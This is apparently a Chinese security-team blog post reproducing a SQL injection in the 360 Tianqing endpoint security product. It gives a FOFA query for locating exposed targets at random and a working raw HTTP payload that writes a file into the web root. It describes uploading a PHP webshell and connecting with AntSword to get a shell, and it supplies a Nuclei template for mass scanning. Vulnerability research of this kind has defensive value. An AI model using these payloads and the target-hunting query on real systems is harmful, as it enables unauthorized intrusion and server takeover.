<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/IYgP_sl4AhsAN0tENOF-nw)

![](https://mmbiz.qpic.cn/mmbiz_png/dMkBHvNs4ZdJwRibhfOJMA5MLxOKZLmvCRI2aPiac0g7yIODGCB0UUBAiaib3LsI1crEAY3yicSsyG9hLExISUPtNiaQ/640)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/NiaOqERrM1vZk9ptOvAicxibPMCq1BHPgM698D7vZleXSQyxRbKySUBdMtqoBuHhAFaia99SL54F3gII0PWyKfk6Hw/640)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Z11VZvDJFsKYvMlrDtnevxAT9XHX8H5xibrNJvmMZCB8xvR2KibJEEn8bT9TM6hLeAia0sNnpkPMicurpbbPmxXsAg/640)

漏洞描述

![](https://mmbiz.qpic.cn/mmbiz_png/k11xXy6jfMedtktMHjz0aicVKh4ztLqmTkkVnjgvIZ36ylOkdhCQrIOEI9cSJdibzBIhq6biavm9AMkSSEdrm4m2w/640)

```
360天擎官方版能够为用户精确检测已知病毒木马、未知恶意代码，有效防御APT攻击，360天擎存在SQL注入漏洞。

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/NiaOqERrM1vZk9ptOvAicxibPMCq1BHPgM698D7vZleXSQyxRbKySUBdMtqoBuHhAFaia99SL54F3gII0PWyKfk6Hw/640)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Z11VZvDJFsKYvMlrDtnevxAT9XHX8H5xibrNJvmMZCB8xvR2KibJEEn8bT9TM6hLeAia0sNnpkPMicurpbbPmxXsAg/640)

漏洞复现

![](https://mmbiz.qpic.cn/mmbiz_png/k11xXy6jfMedtktMHjz0aicVKh4ztLqmTkkVnjgvIZ36ylOkdhCQrIOEI9cSJdibzBIhq6biavm9AMkSSEdrm4m2w/640)

步骤一：在 Fofa 中搜索以下语法并随机确定要进行攻击测试的目标....

```
#FOFA搜索语法
banner="QiAnXin web server" || banner="360 web server"  || body="appid\":\"skylar6" || body="/task/index/detail?id={item.id}" || body="已过期或者未授权，购买请联系4008-136-360"

```

步骤二：开启代理并打开 BP 对其首页进行抓包拦截.... 修改请求包内容.... 在响应数据包的正文中返回是否成功。

```
GET /api/dp/rptsvcsyncpoint?ccid=1';create table O(T TEXT);insert into O(T) values('123456~');copy O(T) to 'C:\Program Files (x86)\360\skylar6\www\1.txt';drop table O;-- HTTP/1.1
Host: ip
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: yourCookie
Connection: close

```

![](https://mmbiz.qpic.cn/mmbiz_png/dMkBHvNs4ZdJwRibhfOJMA5MLxOKZLmvCF1ATGZsm77icuGEhaNfFMqdib31akuFvVezDepZAxn0VZJnffM8fI34A/640?wx_fmt=png)

步骤三：访问上传的文件，即可回显写入的文件内容。

![](https://mmbiz.qpic.cn/mmbiz_png/dMkBHvNs4ZdJwRibhfOJMA5MLxOKZLmvCKs3WrD44OS3Dv7JiaNloPmmZs1a4JZxPN9x8VicB5o2DC183zTcRwzVA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/dMkBHvNs4ZdJwRibhfOJMA5MLxOKZLmvCEzN3D2BfR4YricDzluIKN34DHzbMCzUrIRpNzK88qQKZyuSJx20xrGw/640?wx_fmt=png)

步骤四：尝试上传 PHP 一句话木马，上传成功，并访问。蚁剑连接，成功 getshell。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/NiaOqERrM1vZk9ptOvAicxibPMCq1BHPgM698D7vZleXSQyxRbKySUBdMtqoBuHhAFaia99SL54F3gII0PWyKfk6Hw/640)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/Z11VZvDJFsKYvMlrDtnevxAT9XHX8H5xibrNJvmMZCB8xvR2KibJEEn8bT9TM6hLeAia0sNnpkPMicurpbbPmxXsAg/640)

批量脚本

![](https://mmbiz.qpic.cn/mmbiz_png/k11xXy6jfMedtktMHjz0aicVKh4ztLqmTkkVnjgvIZ36ylOkdhCQrIOEI9cSJdibzBIhq6biavm9AMkSSEdrm4m2w/640)

```
id: qianxin-360-tianqing-rptsvcsyncpoint-sqli
info:
  name: qianxin-360-tianqing-rptsvcsyncpoint-sqli
  author: xingyun
  severity: high
  tags: qianxin,sqli
  description: 360天擎官方版能够为用户精确检测已知病毒木马、未知恶意代码，有效防御APT攻击，360天擎存在SQL注入漏洞。
  metadata: 
    fofa-query: banner="QiAnXin web server" || banner="360 web server"  || body="appid\":\"skylar6" || body="/task/index/detail?id={item.id}" || body="已过期或者未授权，购买请联系4008-136-360"
    verified: true
    max-request: 1
http:
  - raw:
      - |
        @timeout: 50s
        GET /api/dp/rptsvcsyncpoint?ccid=1%27;SELECT%20PG_SLEEP(3)-- HTTP/1.1
        Host: \{\{Hostname\}\}
    matchers:     
      - type: dsl
        name: mysql
        dsl:
          - "status_code_1 == 200 && duration>=3 && contains(body,'file_count') && contains(header,'application/json')"

```

揽月安全团队发布、转载的文章中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途及盈利等目的，否则后果自行承担！！！！！

  

  

![](https://mmbiz.qpic.cn/mmbiz_jpg/dMkBHvNs4ZdJwRibhfOJMA5MLxOKZLmvCMSsBVZJnWGfnfeexrVkTnblzCN3pNIXGA0pVl52Cjib6mricgnfGhBXQ/640)

扫码获取更多精彩